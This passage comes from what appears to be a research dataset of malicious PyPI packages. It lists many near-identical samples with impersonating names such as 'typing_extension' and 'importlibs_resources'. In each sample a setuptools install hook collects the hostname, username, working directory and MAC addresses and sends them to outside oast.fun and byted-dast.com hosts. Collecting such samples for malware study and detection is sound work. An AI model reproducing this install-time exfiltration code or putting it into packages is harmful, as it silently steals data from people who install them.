urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"typing_extension\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-byte-flux-3822a6dd00d6414daba3ae0de3930a5a-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byte-flux_3822a6dd00d6414daba3ae0de3930a5a\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-byted-flex-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byted-flex\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-byted-flux-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byted-flux\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-control4d-multiview-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"control4d_multiview\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-ddim-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ddim\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-12-ic-flow-platform-v91.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"ic-flow-platform\",\n    version=\"91.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-feddecor-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"FedDecor\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-14-byteqs-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"byteqs\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-15-importlibs-resources-v95.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"importlibs_resources\",\n    version=\"95.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-18-dreamfusion-v9.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf0rueg2x53eh2c.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"dreamfusion\",\n    version=\"9.6\",\n    author=\"anon\",\n    author_email=\"xxx@outlook.com\",\n    description=\"anon\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"anon\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-feddecorr-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"FedDecorr\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-kera-preprocess-v94.6",
        "code": "import platform\nimport getpass\nimport os\nimport urllib.parse\nimport urllib.request\nimport random\nimport subprocess\nimport base64\n\ndef get_mac_addresses():\n    mac_addresses = []\n    system = platform.system()\n\n    if system == \"Windows\":\n        output = subprocess.check_output(\"getmac\", shell=True).decode()\n        for line in output.splitlines():\n            if \"Physical\" in line:\n                mac = line.split()[0]\n                mac_addresses.append(mac)\n\n    elif system == \"Linux\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    elif system == \"Darwin\":\n        output = subprocess.check_output(\"ifconfig\", shell=True).decode()\n        for line in output.splitlines():\n            if \"ether\" in line:\n                mac = line.split()[1]\n                mac_addresses.append(mac)\n\n    return mac_addresses\n\ndef main():\n    hostname = platform.node()\n    username = getpass.getuser()\n    current_path = os.getcwd()\n    rd_num = random.randint(10000, 99999)\n    mac_addresses = get_mac_addresses()\n    bs64_encode_mac = base64.b64encode(str(mac_addresses).encode('utf-8')).decode('utf-8')\n\n    urls = [\n        \"http://dnipqouebm-psl.cn.oast-cn.byted-dast.com\",\n        \"http://oqvignkp58-psl.i18n.oast-row.byted-dast.com\",\n        \"http://sbfwstspuutiarcjzptf3c0cvb6yng6mw.oast.fun\"\n    ]\n\n    for url in urls:\n        params = {\n            \"hostname\": hostname,\n            \"username\": username,\n            \"dir\": current_path,\n            \"mac_address\": bs64_encode_mac\n        }\n        full_url = f\"{url}/realtime_p/pypi/{rd_num}?{urllib.parse.urlencode(params)}\"\n        try:\n            with urllib.request.urlopen(full_url) as response:\n                pass\n        except Exception as e:\n            pass\n\n\nif __name__ == \"__main__\":\n    main()\n\nfrom setuptools import setup, find_packages\nfrom setuptools.command.install import install\n\n\nclass CrazyInstallStrat(install):\n    def run(self):\n        install.run(self)\n        from main import main\n        main()\n\nsetup(\n    name=\"kera_preprocess\",\n    version=\"94.6\",\n    author=\"x\",\n    author_email=\"xxx@outlook.com\",\n    description=\"x\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"xxx\",\n    cmdclass={\n        'install': CrazyInstallStrat,\n    },\n    install_requires=['requests', 'psutil'],\n    setup_requires=['setuptools']\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-13-kera-preprocessing-v94.6",
